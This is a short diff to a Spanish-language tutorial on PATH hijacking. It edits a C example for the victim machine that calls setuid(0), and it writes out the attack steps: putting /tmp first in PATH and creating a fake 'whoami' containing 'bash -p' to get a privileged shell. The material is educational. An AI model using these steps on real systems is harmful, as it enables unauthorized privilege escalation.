@@ -4,8 +4,7 @@ PATH Hijacking es una técnica utilizada por los atacantes para secuestrar coman
 ### Ejemplo: 
 *Maquina victima*
 ```c
-	
-	#include <stdio.h> 
+#include <stdio.h> 
 
 int main(){
 	setuid(0);
@@ -23,6 +22,6 @@ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
 export PATH=/tmp/:$PATH 
-nano whoami --> "bash -p"
+echo "bash -p" > whoami
 
 ```
